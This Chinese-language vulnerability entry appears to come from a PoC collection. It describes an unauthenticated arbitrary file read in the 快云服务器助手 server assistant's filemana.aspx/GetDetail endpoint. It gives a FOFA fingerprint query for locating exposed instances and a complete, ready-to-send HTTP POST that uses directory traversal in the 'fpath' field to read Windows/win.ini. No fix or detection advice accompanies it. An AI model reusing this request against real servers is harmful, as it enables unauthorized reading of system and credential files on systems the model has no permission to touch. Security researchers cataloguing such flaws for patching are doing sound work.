# 快云服务器助手GetDetail任意文件读取漏洞

快云服务器助手 filemana.aspx/GetDetail 接口存在任意文件读取漏洞，未经身份验证攻击者可通过该漏洞读取系统重要文件。

## fofa

```javascript
title="快云服务器助手"
```

## poc
```javascript
POST /FileMenu/filemana.aspx/GetDetail HTTP/1.1
Host: 
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:133.0) Gecko/20100101 Firefox/133.0
Accept: */*
Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
Accept-Encoding: gzip, deflate, br, zstd
Content-Type: application/json; charset=utf-8
Connection: keep-alive

{"fpath":"..\\..\\..\\..\\..\\..\\..\\..\\..\\..\\..\\..\\..\\..\\..\\..\\..\\..\\Windows/win.ini"}
```

![image-20250103184809531](https://sydgz2-1310358933.cos.ap-guangzhou.myqcloud.com/pic/202501031848603.png)